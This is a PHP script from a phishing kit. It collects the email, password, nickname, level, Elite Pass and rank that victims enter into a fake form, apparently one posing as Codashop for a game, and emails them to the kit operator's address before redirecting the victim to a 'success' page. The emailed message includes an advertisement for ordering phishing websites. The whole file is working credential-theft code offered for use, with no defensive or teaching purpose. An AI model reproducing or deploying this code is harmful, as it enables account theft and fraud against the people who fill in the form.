<?php
$prov   = $_POST['prov'];
    $email  = $_POST['user'];
    $pass   = $_POST['pass'];
    $nick   = $_POST['nick'];
    $level  = $_POST['level'];
    $ep     = $_POST['ep'];
    $device = $_POST['device'];
    $rank   = $_POST['rank'];

$subject = "$email|Level|$level}";
$message = '
<center> 
<div style="padding:5px;width:294;height:auto;background: #222222;color:#ffc;text-align:center;">
<font size="3.5"><b>BURUAN AMANIN</b></font>
</div>
<table style="border-collapse:collapse;background:#ffc" width="100%" border="1">
 <tr>
  <th style="width:22%;text-align:left;" height="25px"><b>Email</th>
  <th style="width:78%;text-align: center;"><b>'.$email.'</th> 
 </tr>
 <tr>
  <th style="width:22%;text-align:left;" height="25px"><b>Password</th>
  <th style="width:78%;text-align: center;"><b>'.$pass.'</th> 
 </tr>
 <tr>
 <th style="width:22%;text-align:left;" height="25px"><b>Nickname</th>
 <th style="width:78%;text-align: center;"><b>'.$nick.'</th> 
 </tr>
 <tr>
 <th style="width:22%;text-align:left;" height="25px"><b>Level</th>
 <th style="width:78%;text-align: center;"><b>'.$level.'</th> 
 </tr>
 <tr>
 <th style="width:22%;text-align:left;" height="25px"><b>Elite Pass</th>
 <th style="width:78%;text-align: center;"><b>'.$ep.'</th> 
 </tr>
 <tr>
 <th style="width:22%;text-align:left;" height="25px"><b>Rank</th>
 <th style="width:78%;text-align: center;"><b>'.$rank.'</th> 
 </tr>
 </table>
<div style="width: 294; height: 40px; background: #000; color: #fff; padding: 10px; border-bottom-left-radius: 5px; border-bottom-right-radius: 5px; text-align: center;">
<div style="float: left; margin-top: 3%;">
ORDER WEB PHISING/WHM/MWHM KLIK :
</div>
<div style="float: right;">
<a href="https://www.facebook.com/ikhbalabdullah.utama"><img style="margin: 5px;" width="30" src="https://i.ibb.co/SxcV8wB/facebook.png"></a>
</div>
</div>
</center>
';
include 'email.php';
$headersx  = 'MIME-Version: 1.0' . "\r\n";
$headersx .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headersx .= 'From: IkhbalJb|Codashop| <fadpoi@hentai.com>' . "\r\n";
$datamail = mail($pulberaja, $subject, $message, $headersx);
?>
<html>
<head>
<meta http-equiv="REFRESH" content="0;url=success.php">
</head>
<body>
</body>
</html>